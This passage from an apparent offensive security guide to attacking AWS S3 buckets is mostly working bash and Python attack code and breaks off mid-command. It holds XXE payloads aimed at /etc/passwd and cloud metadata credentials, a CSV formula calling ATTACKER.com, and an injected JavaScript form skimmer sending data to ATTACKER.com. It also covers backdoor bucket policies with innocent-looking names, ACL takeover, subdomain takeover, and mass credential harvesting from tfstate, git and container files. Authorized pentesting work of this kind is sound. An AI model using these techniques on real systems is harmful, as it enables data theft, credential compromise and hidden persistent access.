    echo "  URL: http://${bucket}.s3-website-${REGION}.amazonaws.com"
  fi
  
  # ============================================
  # Lifecycle Rules
  # ============================================
  aws s3api get-bucket-lifecycle-configuration --bucket $bucket --profile $PROFILE \
    > "$OUTDIR/$bucket/lifecycle.json" 2>/dev/null
  
  # ============================================
  # Replication
  # ============================================
  REPLICATION=$(aws s3api get-bucket-replication --bucket $bucket --profile $PROFILE 2>/dev/null)
  if [ ! -z "$REPLICATION" ]; then
    echo "$REPLICATION" > "$OUTDIR/$bucket/replication.json"
    DEST=$(echo "$REPLICATION" | jq -r '.ReplicationConfiguration.Rules[].Destination.Bucket')
    echo "  [!] Replication enabled → $DEST"
  fi
  
  # ============================================
  # Event Notifications
  # ============================================
  aws s3api get-bucket-notification-configuration --bucket $bucket --profile $PROFILE \
    > "$OUTDIR/$bucket/notifications.json" 2>/dev/null
  
  # Check for Lambda triggers
  LAMBDA_TRIGGER=$(jq -r '.LambdaFunctionConfigurations[]?.LambdaFunctionArn // empty' \
    "$OUTDIR/$bucket/notifications.json" 2>/dev/null)
  if [ ! -z "$LAMBDA_TRIGGER" ]; then
    echo "  [!] Lambda trigger: $LAMBDA_TRIGGER"
  fi
  
  # ============================================
  # Object count and size summary
  # ============================================
  echo "  [*] Getting object count..."
  OBJ_COUNT=$(aws s3 ls s3://$bucket --recursive --profile $PROFILE 2>/dev/null | wc -l)
  echo "  Objects: $OBJ_COUNT"
  
  # List first 100 objects for analysis
  aws s3 ls s3://$bucket --recursive --profile $PROFILE 2>/dev/null | head -100 \
    > "$OUTDIR/$bucket/sample-objects.txt"
  
  # Search for sensitive files in listing
  echo "  [*] Searching for sensitive files..."
  SENSITIVE=$(cat "$OUTDIR/$bucket/sample-objects.txt" | \
    grep -iE '\.sql|\.bak|\.backup|\.dump|\.env|\.pem|\.key|\.pfx|\.p12|\.jks|password|secret|credential|\.tfstate|\.git|config\.(yml|yaml|json|xml)|id_rsa|\.htpasswd')
  if [ ! -z "$SENSITIVE" ]; then
    echo "  [!!!] SENSITIVE FILES FOUND:"
    echo "$SENSITIVE" | head -20 | while read f; do
      echo "    $f"
    done
  fi

done

echo ""
echo "================================================================"
echo "[+] Enumeration complete! Results in: $OUTDIR"
echo "================================================================"
```

### Object Version Enumeration

```bash [Object Versioning Enumeration]
# ============================================
# Enumerate object versions (deleted files recovery!)
# ============================================

BUCKET="target-company-backups"

# List all object versions (including deleted!)
aws s3api list-object-versions --bucket $BUCKET \
  --query 'Versions[*].[Key,VersionId,IsLatest,LastModified,Size]' \
  --output table

# List DELETE MARKERS (files that were "deleted" but still recoverable)
aws s3api list-object-versions --bucket $BUCKET \
  --query 'DeleteMarkers[*].[Key,VersionId,LastModified]' \
  --output table

# Recover a deleted file by downloading a specific version
aws s3api get-object \
  --bucket $BUCKET \
  --key "secrets/database-credentials.json" \
  --version-id "previous-version-id" \
  /tmp/recovered-credentials.json

# Download ALL versions of a specific file
KEY="config/application.properties"
aws s3api list-object-versions --bucket $BUCKET --prefix "$KEY" \
  --query 'Versions[*].[VersionId,LastModified]' --output text | \
  while read version_id modified; do
    echo "[*] Downloading version: $version_id ($modified)"
    aws s3api get-object \
      --bucket $BUCKET \
      --key "$KEY" \
      --version-id "$version_id" \
      "/tmp/versions/${KEY//\//_}_${version_id}"
  done

# Search old versions for secrets that were "removed"
echo "[*] Checking deleted objects for sensitive files..."
aws s3api list-object-versions --bucket $BUCKET \
  --query 'DeleteMarkers[*].Key' --output text | tr '\t' '\n' | \
  grep -iE '\.env|credential|secret|password|key|config|backup|\.sql|\.tfstate' | \
  while read key; do
    echo "[!!!] Deleted sensitive file: $key"
    # Get the last version before deletion
    last_version=$(aws s3api list-object-versions --bucket $BUCKET --prefix "$key" \
      --query 'Versions[0].VersionId' --output text)
    echo "  Last version: $last_version"
  done
```

---

## Exploitation

### Public Read Exploitation

```bash [Public Read — Mass Download]
# ============================================
# Download everything from a publicly readable bucket
# ============================================

BUCKET="target-company-public"

# Method 1: AWS CLI sync (fastest)
aws s3 sync s3://$BUCKET ./loot/$BUCKET/ --no-sign-request

# Method 2: Selective download — only interesting files
aws s3 ls s3://$BUCKET --recursive --no-sign-request | \
  grep -iE '\.(sql|bak|dump|env|pem|key|pfx|p12|csv|xlsx|json|yml|yaml|xml|conf|config|log|tar|gz|zip|7z|rar)$' | \
  awk '{print $4}' | while read file; do
    echo "[*] Downloading: $file"
    aws s3 cp "s3://$BUCKET/$file" "./loot/$BUCKET/$file" --no-sign-request
  done

# Method 3: Download with size limit (skip huge files)
aws s3 ls s3://$BUCKET --recursive --no-sign-request | \
  awk '$3 < 104857600 {print $4}' | while read file; do  # < 100MB
    aws s3 cp "s3://$BUCKET/$file" "./loot/$BUCKET/$file" --no-sign-request 2>/dev/null
  done

# Method 4: Parallel download with curl
aws s3 ls s3://$BUCKET --recursive --no-sign-request | awk '{print $4}' | \
  xargs -P 20 -I {} curl -s -o "./loot/$BUCKET/{}" \
    "https://${BUCKET}.s3.amazonaws.com/{}"
```

### Public Write Exploitation

::caution
**Only perform write operations during authorized pentests.** Document everything. Public write access enables defacement, malware hosting, and data poisoning.
::

::accordion

  :::accordion-item
  ---
  icon: i-lucide-alert-triangle
  label: "Attack: Static Website Defacement"
  ---
  If the bucket hosts a static website and is publicly writable, you can replace content.

  ```bash [Website Defacement]
  BUCKET="target-company-website"

  # Check if static website hosting is enabled
  aws s3api get-bucket-website --bucket $BUCKET --no-sign-request 2>/dev/null

  # Upload proof-of-concept defacement (AUTHORIZED PENTEST ONLY)
  cat > /tmp/pentest-poc.html << 'EOF'
  <html>
  <body>
  <h1>Security Assessment - Proof of Concept</h1>
  <p>This page was uploaded by [YOUR COMPANY] during an authorized security assessment.</p>
  <p>Timestamp: TIMESTAMP</p>
  <p>Contact: security@yourcompany.com</p>
  </body>
  </html>
  EOF

  sed -i "s/TIMESTAMP/$(date)/" /tmp/pentest-poc.html

  # Upload to a NON-CRITICAL path
  aws s3 cp /tmp/pentest-poc.html s3://$BUCKET/pentest-poc.html \
    --no-sign-request \
    --content-type "text/html"

  # Verify
  curl -s "http://${BUCKET}.s3-website-us-east-1.amazonaws.com/pentest-poc.html"

  # CLEAN UP IMMEDIATELY
  aws s3 rm s3://$BUCKET/pentest-poc.html --no-sign-request
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-alert-triangle
  label: "Attack: Malicious Object Injection"
  ---
  Upload objects that will be processed by backend systems (Lambda triggers, ETL pipelines, etc.).

  ```bash [Object Injection]
  BUCKET="target-company-uploads"

  # If the bucket triggers Lambda on upload,
  # craft payloads based on what the function processes

  # CSV injection (if Lambda processes CSVs)
  cat > /tmp/malicious.csv << 'EOF'
  Name,Email,Amount
  =cmd|'/C curl https://ATTACKER.com/csv-rce'!A0,test@test.com,100
  normal,normal@test.com,200
  EOF

  aws s3 cp /tmp/malicious.csv s3://$BUCKET/imports/data.csv --no-sign-request

  # XML injection (if Lambda parses XML)
  cat > /tmp/malicious.xml << 'EOF'
  <?xml version="1.0"?>
  <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    <!ENTITY xxe2 SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ]>
  <data><item>&xxe;</item><item2>&xxe2;</item2></data>
  EOF

  aws s3 cp /tmp/malicious.xml s3://$BUCKET/inbox/data.xml --no-sign-request

  # Archive with path traversal (zip slip)
  python3 -c "
  import zipfile, io
  buf = io.BytesIO()
  with zipfile.ZipFile(buf, 'w') as zf:
      zf.writestr('../../tmp/pwned.txt', 'zip slip successful')
      zf.writestr('normal.txt', 'normal file')
  with open('/tmp/zipslip.zip', 'wb') as f:
      f.write(buf.getvalue())
  "
  aws s3 cp /tmp/zipslip.zip s3://$BUCKET/uploads/archive.zip --no-sign-request
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-alert-triangle
  label: "Attack: Supply Chain Poisoning"
  ---
  If the bucket serves JavaScript, CSS, or software packages, inject malicious code.

  ```bash [Supply Chain Attack]
  BUCKET="target-company-cdn"

  # If bucket serves JS files for the website
  # Download existing file
  curl -s "https://${BUCKET}.s3.amazonaws.com/js/analytics.js" > /tmp/original.js

  # Inject payload
  cat >> /tmp/original.js << 'EOF'

  // Injected payload — credential harvesting
  document.addEventListener('submit', function(e) {
    var form = e.target;
    var data = new FormData(form);
    var obj = {};
    data.forEach(function(v,k){ obj[k] = v; });
    navigator.sendBeacon('https://ATTACKER.com/harvest', JSON.stringify(obj));
  });
  EOF

  # Upload modified file
  aws s3 cp /tmp/original.js s3://$BUCKET/js/analytics.js \
    --no-sign-request \
    --content-type "application/javascript" \
    --cache-control "max-age=0"

  # All users visiting the website now execute your JS
  ```
  :::

::

### Bucket Policy Manipulation

```bash [Policy Exploitation]
# ============================================
# If you can read/write bucket policies
# ============================================

BUCKET="target-company-data"

# Read current policy
aws s3api get-bucket-policy --bucket $BUCKET --query 'Policy' --output text | jq .

# ============================================
# Attack 1: Grant yourself full access
# ============================================
cat > /tmp/backdoor-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "LegitimateAccess",
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::$BUCKET",
        "arn:aws:s3:::$BUCKET/*"
      ]
    }
  ]
}
EOF

aws s3api put-bucket-policy --bucket $BUCKET --policy file:///tmp/backdoor-policy.json

# ============================================
# Attack 2: Make entire bucket public
# ============================================
cat > /tmp/public-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicRead",
      "Effect": "Allow",
      "Principal": "*",
      "Action": ["s3:GetObject", "s3:ListBucket"],
      "Resource": [
        "arn:aws:s3:::$BUCKET",
        "arn:aws:s3:::$BUCKET/*"
      ]
    }
  ]
}
EOF

# ============================================
# Attack 3: Sneaky — Add your access to existing policy
# ============================================
EXISTING=$(aws s3api get-bucket-policy --bucket $BUCKET --query 'Policy' --output text)

echo "$EXISTING" | jq '.Statement += [{
  "Sid": "CloudWatchMetrics",
  "Effect": "Allow",
  "Principal": {"AWS": "arn:aws:iam::ATTACKER_ACCOUNT:root"},
  "Action": "s3:*",
  "Resource": ["arn:aws:s3:::'$BUCKET'", "arn:aws:s3:::'$BUCKET'/*"]
}]' > /tmp/modified-policy.json

aws s3api put-bucket-policy --bucket $BUCKET --policy file:///tmp/modified-policy.json
```

### ACL Exploitation

```bash [ACL Attacks]
# ============================================
# ACL-based access manipulation
# ============================================

BUCKET="target-company-data"

# Read current ACL
aws s3api get-bucket-acl --bucket $BUCKET

# ============================================
# Attack 1: Grant public read via ACL
# ============================================
aws s3api put-bucket-acl --bucket $BUCKET --acl public-read

# ============================================
# Attack 2: Grant authenticated users full control
# ============================================
aws s3api put-bucket-acl --bucket $BUCKET --acl authenticated-read

# ============================================
# Attack 3: Grant specific account access
# ============================================
aws s3api put-bucket-acl --bucket $BUCKET \
  --grant-full-control id=ATTACKER_CANONICAL_USER_ID

# Get your canonical user ID:
aws s3api list-buckets --query 'Owner.ID' --output text

# ============================================
# Attack 4: Object-level ACL override
# ============================================
# Even if bucket ACL is locked, individual objects might be modifiable
aws s3api put-object-acl \
  --bucket $BUCKET \
  --key "sensitive/credentials.json" \
  --acl public-read

# ============================================
# Attack 5: ACL with XML
# ============================================
cat > /tmp/evil-acl.xml << EOF
<AccessControlPolicy>
  <Owner>
    <ID>ORIGINAL_OWNER_ID</ID>
  </Owner>
  <AccessControlList>
    <Grant>
      <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="CanonicalUser">
        <ID>ORIGINAL_OWNER_ID</ID>
      </Grantee>
      <Permission>FULL_CONTROL</Permission>
    </Grant>
    <Grant>
      <Grantee xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="CanonicalUser">
        <ID>ATTACKER_CANONICAL_ID</ID>
      </Grantee>
      <Permission>FULL_CONTROL</Permission>
    </Grant>
  </AccessControlList>
</AccessControlPolicy>
EOF

aws s3api put-bucket-acl --bucket $BUCKET --access-control-policy file:///tmp/evil-acl.xml
```

### Presigned URL Attacks

```bash [Presigned URL Exploitation]
# ============================================
# Presigned URL generation and abuse
# ============================================

# If you have s3:GetObject permission, generate presigned URLs
# to share access with others without giving them AWS credentials

# Generate presigned URL (default: 1 hour expiry)
aws s3 presign s3://target-bucket/sensitive/database-backup.sql

# Generate with extended expiry (up to 7 days for IAM user)
aws s3 presign s3://target-bucket/sensitive/database-backup.sql \
  --expires-in 604800

# Generate for ALL sensitive files
aws s3 ls s3://target-bucket/ --recursive | \
  grep -iE '\.(sql|bak|env|key|pem|csv)$' | awk '{print $4}' | \
  while read file; do
    url=$(aws s3 presign "s3://target-bucket/$file" --expires-in 604800)
    echo "$file: $url"
  done > /tmp/presigned-urls.txt

# ============================================
# Presigned URL for upload (PUT)
# ============================================
python3 << 'PYEOF'
import boto3

s3 = boto3.client('s3')

# Generate presigned URL for uploading
url = s3.generate_presigned_url(
    'put_object',
    Params={
        'Bucket': 'target-bucket',
        'Key': 'uploads/malicious-file.txt',
        'ContentType': 'text/plain'
    },
    ExpiresIn=86400  # 24 hours
)
print(f"Upload URL: {url}")

# Usage: curl -X PUT -d "malicious content" "$URL"
PYEOF

# ============================================
# Finding leaked presigned URLs
# ============================================

# Search web pages for presigned URLs
curl -s https://target.com | grep -oP 'https?://[^"<>\s]*X-Amz-Signature[^"<>\s]*'

# Leaked presigned URLs in JavaScript
curl -s https://target.com/app.js | grep -oP 'https?://[^"<>\s\x27]*X-Amz-Signature[^"<>\s\x27]*'

# Presigned URLs in API responses (via Burp)
# Look for responses containing "X-Amz-Signature" and "X-Amz-Expires"

# Check if presigned URL has expired
URL="https://bucket.s3.amazonaws.com/file?X-Amz-Algorithm=...&X-Amz-Expires=3600&..."
curl -s -o /dev/null -w "%{http_code}" "$URL"
# 200 = still valid, 403 = expired
```

### S3 Subdomain Takeover

```bash [Subdomain Takeover]
# ============================================
# S3 Subdomain Takeover
# ============================================

# Condition: CNAME record points to S3, but bucket doesn't exist

# Step 1: Find CNAME pointing to S3
dig +short CNAME assets.target.com
# Output: assets.target.com.s3.amazonaws.com

# Step 2: Verify bucket doesn't exist
curl -s http://assets.target.com.s3.amazonaws.com/
# Output: <Code>NoSuchBucket</Code>

# Step 3: Create the bucket in YOUR account
aws s3 mb s3://assets.target.com --region us-east-1

# Step 4: Enable static website hosting
aws s3 website s3://assets.target.com \
  --index-document index.html \
  --error-document error.html

# Step 5: Upload proof-of-concept
cat > /tmp/index.html << 'EOF'
<html>
<body>
<h1>S3 Subdomain Takeover - Proof of Concept</h1>
<p>This domain (assets.target.com) is vulnerable to subdomain takeover.</p>
<p>Report: security@yourcompany.com</p>
</body>
</html>
EOF

aws s3 cp /tmp/index.html s3://assets.target.com/index.html \
  --content-type "text/html"

# Set public read policy
aws s3api put-bucket-policy --bucket assets.target.com --policy '{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::assets.target.com/*"
  }]
}'

# Step 6: Verify takeover
curl http://assets.target.com
# Your content is now served on their subdomain!

# ============================================
# Automated subdomain takeover scanning
# ============================================
# Using subjack
subjack -w /tmp/subdomains.txt -t 100 -timeout 30 -o /tmp/takeover-results.txt -ssl

# Using nuclei
nuclei -l /tmp/subdomains.txt -t nuclei-templates/takeovers/ -o /tmp/takeover-nuclei.txt

# Manual mass check
cat /tmp/subdomains.txt | while read sub; do
  cname=$(dig +short CNAME $sub 2>/dev/null)
  if echo "$cname" | grep -qi "s3\.amazonaws\.com"; then
    status=$(curl -s "http://$cname" | grep -c "NoSuchBucket")
    if [ "$status" -gt 0 ]; then
      echo "[TAKEOVER] $sub -> $cname"
    fi
  fi
done
```

---

## Privilege Escalation

### From S3 to Account Compromise

::note
S3 buckets often contain **credentials, configuration files, and infrastructure-as-code** that enable full account takeover. Treat every bucket like a potential goldmine of secrets.
::

::accordion

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 1: Credentials in S3 Objects"
  ---
  ```bash [Find Credentials in S3]
  # Search ALL accessible buckets for credentials
  
  for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
    echo "[*] Searching: $bucket"
    
    # List and search for credential files
    aws s3 ls s3://$bucket --recursive 2>/dev/null | \
      grep -iE '\.env|credential|secret|password|\.pem|\.key|\.pfx|id_rsa|\.git|\.aws|config\.(yml|yaml|json)|application\.properties|appsettings|\.tfstate' | \
      while read line; do
        file=$(echo "$line" | awk '{print $4}')
        echo "  [!!!] $file"
        
        # Download and extract secrets
        aws s3 cp "s3://$bucket/$file" "/tmp/s3-creds/$bucket/$(basename $file)" 2>/dev/null
      done
  done
  
  # Scan downloaded files for AWS keys
  grep -rn "AKIA[0-9A-Z]\{16\}" /tmp/s3-creds/
  grep -rn "aws_secret_access_key" /tmp/s3-creds/
  grep -rn "aws_session_token" /tmp/s3-creds/
  
  # Scan for other credentials
  grep -rnE "password\s*[:=]\s*\S+" /tmp/s3-creds/
  grep -rnE "BEGIN (RSA |EC )?PRIVATE KEY" /tmp/s3-creds/
  grep -rnE "(mongodb|mysql|postgres|redis)://[^\s]+" /tmp/s3-creds/
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 2: Terraform State Files"
  ---
  ```bash [Terraform State Exploitation]
  # Terraform state files contain ALL resource details including secrets
  
  # Find .tfstate files
  aws s3 ls s3://target-terraform-state/ --recursive | grep "\.tfstate"
  
  # Download state file
  aws s3 cp s3://target-terraform-state/production/terraform.tfstate /tmp/terraform.tfstate
  
  # Extract secrets from state
  # AWS access keys
  cat /tmp/terraform.tfstate | jq -r '.. | .access_key? // empty' 2>/dev/null
  cat /tmp/terraform.tfstate | jq -r '.. | .secret_key? // empty' 2>/dev/null
  
  # Database passwords
  cat /tmp/terraform.tfstate | jq -r '.. | .password? // empty' 2>/dev/null
  cat /tmp/terraform.tfstate | jq -r '.. | .master_password? // empty' 2>/dev/null
  
  # All sensitive values
  cat /tmp/terraform.tfstate | jq -r '
    .resources[]? |
    select(.instances[]?.attributes | keys[] | test("password|secret|key|token"; "i")) |
    {type: .type, name: .name, sensitive_attrs: [.instances[].attributes | to_entries[] | select(.key | test("password|secret|key|token"; "i"))]}
  ' 2>/dev/null
  
  # Full resource inventory
  cat /tmp/terraform.tfstate | jq -r '.resources[] | "\(.type) : \(.name)"' 2>/dev/null
  
  # RDS endpoints and credentials
  cat /tmp/terraform.tfstate | jq -r '
    .resources[] | select(.type == "aws_db_instance") |
    .instances[].attributes | {
      endpoint: .endpoint,
      username: .username,
      password: .password,
      db_name: .db_name,
      engine: .engine
    }
  ' 2>/dev/null
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 3: CloudFormation Templates"
  ---
  ```bash [CloudFormation Template Exploitation]
  # CloudFormation templates may contain hardcoded secrets
  
  # Find CF templates in S3
  for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
    aws s3 ls s3://$bucket --recursive 2>/dev/null | \
      grep -iE 'template\.(yaml|yml|json)|cloudformation|\.template' | \
      while read line; do
        file=$(echo "$line" | awk '{print $4}')
        echo "[CF] s3://$bucket/$file"
        aws s3 cp "s3://$bucket/$file" "/tmp/cf-templates/$(basename $file)" 2>/dev/null
      done
  done
  
  # Search templates for secrets
  grep -rn "Default:\|Password\|Secret\|AccessKey" /tmp/cf-templates/
  
  # If writable — modify CF template to add backdoor resources
  # Next time the stack is updated, your backdoor gets deployed
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 4: Lambda Deployment Packages"
  ---
  ```bash [Lambda Code in S3]
  # Lambda deployment packages are often stored in S3
  
  # Find Lambda deployment buckets
  for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
    aws s3 ls s3://$bucket --recursive 2>/dev/null | \
      grep -iE '\.zip$|lambda|function|deployment|package' | head -5 | \
      while read line; do
        echo "[LAMBDA] s3://$bucket/$(echo $line | awk '{print $4}')"
      done
  done
  
  # Download and analyze Lambda packages
  aws s3 cp s3://target-lambda-deployments/payment-function.zip /tmp/
  unzip /tmp/payment-function.zip -d /tmp/payment-function/
  
  # Search for secrets in Lambda code
  grep -rn "password\|secret\|api_key\|AKIA" /tmp/payment-function/
  
  # If bucket is WRITABLE — backdoor the Lambda package!
  # (Function will use your code on next deployment)
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 5: .git Directories in S3"
  ---
  ```bash [Git Repository Exposure]
  # Check if .git directory is in S3
  aws s3 ls s3://target-bucket/.git/ --no-sign-request 2>/dev/null
  
  # Download entire .git directory
  aws s3 sync s3://target-bucket/.git/ /tmp/git-repo/.git/ --no-sign-request
  
  # Reconstruct the repository
  cd /tmp/git-repo
  git checkout -- .
  
  # Search git history for secrets
  git log --all --oneline
  git log --all -p | grep -E "password|secret|key|token|AKIA"
  
  # Use trufflehog on the recovered repo
  trufflehog filesystem /tmp/git-repo/
  
  # Use gitleaks
  gitleaks detect --source=/tmp/git-repo/ -v
  ```
  :::

  :::accordion-item
  ---
  icon: i-lucide-arrow-up-circle
  label: "Path 6: Docker/Container Images"
  ---
  ```bash [Container Images in S3]
  # Find container images or Docker configs
  for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
    aws s3 ls s3://$bucket --recursive 2>/dev/null | \
      grep -iE 'docker|container|\.tar$|Dockerfile|docker-compose' | \
      while read line; do
        echo "[DOCKER] s3://$bucket/$(echo $line | awk '{print $4}')"
      done
  done
  
  # Download and extract Docker image layers
  aws s3 cp s3://target-bucket/images/app.tar /tmp/docker-image.tar
  
  mkdir /tmp/docker-layers
  tar -xf /tmp/docker-image.tar -C /tmp/docker-layers/
  
  # Search layers for secrets
  find /tmp/docker-layers -name "*.tar" | while read layer; do
    tar -tf "$layer" 2>/dev/null | grep -iE '\.env|credential|secret|config|\.pem|\.key'
  done
  
  # Extract and search
  find /tmp/docker-layers -name "*.tar" | while read layer; do
    tar -xf "$layer" -C /tmp/docker-extracted/ 2>/dev/null
  done
  
  grep -rn "AKIA\|password\|secret" /tmp/docker-extracted/
  ```
  :::

::

### Mass Secret Scanner

```python [s3_secret_scanner.py]
#!/usr/bin/env python3
"""
S3 Secret Scanner — Scan all accessible S3 buckets for sensitive data
"""

import boto3
import json
import re
import os
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

class S3SecretScanner:
    def __init__(self, profile=None):
        session = boto3.Session(profile_name=profile) if profile else boto3.Session()
        self.s3 = session.client('s3')
        self.findings = []
        self.output_dir = f"./s3-secrets-{datetime.now().strftime('%Y%m%d-%H%M%S')}"
        os.makedirs(self.output_dir, exist_ok=True)
        
        self.sensitive_extensions = {
            '.env', '.pem', '.key', '.pfx', '.p12', '.jks',
            '.sql', '.bak', '.backup', '.dump', '.tar', '.gz',
            '.zip', '.7z', '.rar', '.csv', '.xlsx', '.xls',
            '.tfstate', '.tfvars',
        }
        
        self.sensitive_filenames = {
            'credentials', 'credentials.json', 'credentials.yml',
            'secrets.json', 'secrets.yml', 'secrets.yaml',
            '.env', '.env.production', '.env.staging', '.env.local',
            'id_rsa', 'id_dsa', 'id_ecdsa', 'id_ed25519',
            '.htpasswd', '.htaccess', '.git/config',
            'wp-config.php', 'config.php', 'database.yml',
            'application.properties', 'appsettings.json',
            'docker-compose.yml', 'Dockerfile',
            'serverless.yml', 'template.yaml',
            'terraform.tfstate', 'terraform.tfstate.backup',
            'ansible.cfg', 'vault.yml',
            'private.key', 'server.key', 'cert.pem',
            'shadow', 'passwd', 'authorized_keys',
        }
        
        self.secret_patterns = [
            (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),
            (r'ASIA[0-9A-Z]{16}', 'AWS Temp Access Key'),
            (r'(?i)aws_secret_access_key\s*[=:]\s*[A-Za-z0-9/+=]{40}', 'AWS Secret Key'),
            (r'-----BEGIN (RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----', 'Private Key'),
            (r'(?i)(password|passwd|pwd)\s*[=:]\s*["\']?[^\s"\']{4,}', 'Password'),
            (r'(?i)(api[_-]?key|apikey)\s*[=:]\s*["\']?[A-Za-z0-9]{16,}', 'API Key'),
            (r'(?i)(secret|token)\s*[=:]\s*["\']?[A-Za-z0-9/+=_-]{8,}', 'Secret/Token'),
            (r'(?i)(mongodb|mysql|postgres|redis|amqp)://[^\s"\']+', 'Connection String'),
            (r'(?i)bearer\s+[A-Za-z0-9._~+/=-]{20,}', 'Bearer Token'),
            (r'ghp_[A-Za-z0-9]{36}', 'GitHub Personal Token'),
            (r'sk_live_[A-Za-z0-9]{24,}', 'Stripe Secret Key'),
            (r'sq0csp-[A-Za-z0-9_-]{43}', 'Square Access Token'),
            (r'(?i)slack[_-]?token\s*[=:]\s*xox[bpors]-[A-Za-z0-9-]+', 'Slack Token'),
        ]
    
    def scan_all_buckets(self, max_objects_per_bucket=10000, max_file_size_mb=50):
        """Scan all accessible buckets"""
        buckets = self.s3.list_buckets()['Buckets']
        print(f"[*] Found {len(buckets)} buckets")
        
        for bucket in buckets:
            name = bucket['Name']
            print(f"\n[*] Scanning: {name}")
            self._scan_bucket(name, max_objects_per_bucket, max_file_size_mb)
        
        self._save_report()
    
    def _scan_bucket(self, bucket_name, max_objects, max_size_mb):
        """Scan a single bucket for secrets"""
        try:
            paginator = self.s3.get_paginator('list_objects_v2')
            object_count = 0
            
            for page in paginator.paginate(Bucket=bucket_name):
                for obj in page.get('Contents', []):
                    key = obj['Key']
                    size = obj['Size']
                    object_count += 1
                    
                    if object_count > max_objects:
                        print(f"  [!] Reached max objects limit ({max_objects})")
                        return
                    
                    # Check filename
                    basename = os.path.basename(key).lower()
                    ext = os.path.splitext(key)[1].lower()
                    
                    is_sensitive = (
                        ext in self.sensitive_extensions or
                        basename in self.sensitive_filenames or
                        any(p in key.lower() for p in [
                            '.git/', 'credential', 'secret', 'password',
                            'backup', '.env', 'private', 'terraform'
                        ])
                    )
                    
                    if is_sensitive:
                        finding = {
                            'bucket': bucket_name,
                            'key': key,
                            'size': size,
                            'type': 'sensitive_filename',
                            'severity': 'HIGH'
                        }
                        self.findings.append(finding)
                        print(f"  [!] Sensitive file: {key} ({size} bytes)")
                        
                        # Download and scan content for small files
                        if size < max_size_mb * 1024 * 1024 and size > 0:
                            self._scan_content(bucket_name, key)
                    
                    # Scan small text files even if name isn't sensitive
                    elif size < 1024 * 1024 and ext in {'.json', '.yml', '.yaml', '.xml', '.conf', '.cfg', '.ini', '.properties', '.txt', '.log', '.sh', '.py', '.js', '.rb'}:
                        self._scan_content(bucket_name, key)
                        
        except Exception as e:
            print(f"  [-] Error scanning {bucket_name}: {e}")
    
    def _scan_content(self, bucket, key):
        """Download and scan file content for secrets"""
        try:
            response = self.s3.get_object(Bucket=bucket, Key=key)
            content = response['Body'].read()
            
            try:
                text = content.decode('utf-8', errors='ignore')
            except:
                return
            
            for pattern, description in self.secret_patterns:
                matches = re.findall(pattern, text)
                if matches:
                    for match in matches[:3]:
                        finding = {
                            'bucket': bucket,
                            'key': key,
                            'type': 'secret_in_content',
                            'pattern': description,
                            'match': str(match)[:100],
                            'severity': 'CRITICAL'
                        }
                        self.findings.append(finding)
                        print(f"  [!!!] {description} in {key}: {str(match)[:50]}...")
            
            # Save interesting files
            if any(re.search(p, text) for p, _ in self.secret_patterns):
                safe_key = key.replace('/', '_')
                filepath = os.path.join(self.output_dir, f"{bucket}_{safe_key}")
                with open(filepath, 'wb') as f:
                    f.write(content)
                    
        except Exception as e:
            pass
    
    def _save_report(self):
        """Save findings report"""
        report = {
            'scan_time': datetime.now().isoformat(),
            'total_findings': len(self.findings),
            'critical': len([f for f in self.findings if f['severity'] == 'CRITICAL']),
            'high': len([f for f in self.findings if f['severity'] == 'HIGH']),
            'findings': self.findings
        }
        
        report_path = os.path.join(self.output_dir, 'report.json')
        with open(report_path, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{'='*60}")
        print(f"SCAN COMPLETE")
        print(f"{'='*60}")
        print(f"Total findings: {report['total_findings']}")
        print(f"  CRITICAL: {report['critical']}")
        print(f"  HIGH: {report['high']}")
        print(f"Report: {report_path}")

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--profile', default=None)
    parser.add_argument('--max-objects', type=int, default=10000)
    parser.add_argument('--max-size-mb', type=int, default=50)
    args = parser.parse_args()
    
    scanner = S3SecretScanner(profile=args.profile)
    scanner.scan_all_buckets(args.max_objects, args.max_size_mb)
```

---

## Persistence & Evasion

### Persistence Techniques

::tabs
  :::tabs-item{icon="i-lucide-door-open" label="Policy Backdoor"}
  ```bash [Bucket Policy Persistence]
  # ============================================
  # Persistent access via hidden bucket policy statement
  # ============================================
  
  BUCKET="target-company-data"
  ATTACKER_ACCOUNT="999888777666"
  
  # Get existing policy
  EXISTING=$(aws s3api get-bucket-policy --bucket $BUCKET \
    --query 'Policy' --output text 2>/dev/null)
  
  if [ -z "$EXISTING" ] || [ "$EXISTING" == "None" ]; then
    EXISTING='{"Version":"2012-10-17","Statement":[]}'
  fi
  
  # Add subtle backdoor statement
  # Named to look legitimate
  echo "$EXISTING" | jq '.Statement += [{
    "Sid": "CloudTrailAuditLog",
    "Effect": "Allow",
    "Principal": {
      "AWS": "arn:aws:iam::'$ATTACKER_ACCOUNT':root"
    },
    "Action": [
      "s3:GetObject",
      "s3:ListBucket",
      "s3:GetBucketLocation"
    ],
    "Resource": [
